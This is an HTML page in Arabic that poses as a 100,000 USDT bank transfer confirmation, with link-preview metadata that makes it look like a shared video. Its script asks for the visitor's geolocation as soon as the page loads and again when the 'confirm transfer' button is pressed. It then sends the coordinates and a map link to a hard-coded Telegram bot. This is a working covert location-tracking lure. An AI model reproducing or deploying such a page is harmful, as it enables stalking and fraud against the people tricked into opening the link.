<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فيديو التحويل</title>

<!-- بيانات الميتا لتظهر كمعاينة عند مشاركة الرابط -->
<meta property="og:title" content="فيديو تحويل بنكي ناجح">
<meta property="og:description" content="بنك الهرم - تم تحويل 100,000 USDT">
<meta property="og:image" content="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg">
<meta property="og:type" content="video.other">
<meta property="og:url" content="رابط_صفحتك_هنا.html">

<style>
  body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background: #f0f0f0;
  }
  .card {
    width: 400px;
    border-radius: 10px;
    overflow: hidden;
    box-shadow: 0 5px 20px rgba(0,0,0,0.3);
    background: #fff;
    text-align: center;
  }
  .card img {
    width: 100%;
    display: block;
  }
  .card-content {
    padding: 20px;
  }
  button {
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    background-color: #f1c40f;
    color: #000;
    cursor: pointer;
    border-radius: 5px;
    margin-top: 15px;
  }
  button:hover {
    background-color: #d4ac0d;
  }
</style>
</head>
<body>

<div class="card">
  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="بطاقة تحويل">
  <div class="card-content">
    <h2>تأكيد تحويل بنكي</h2>
    <p>بنك الهرم - التحويل بنجاح</p>
    <p>المبلغ: 100,000 USDT</p>
    <button onclick="getLocation()">تأكيد التحويل</button>
  </div>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("✅ تم الإرسال:", data))
    .catch(err => console.error("❌ خطأ:", err));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendLocationToBot(lat, lon);
            },
            err => {
                console.error("⚠️ لم يتم السماح بالحصول على الموقع");
            }
        );
    }
}

// إرسال الموقع تلقائيًا عند فتح الصفحة
getLocation();
</script>

</body>
</html>
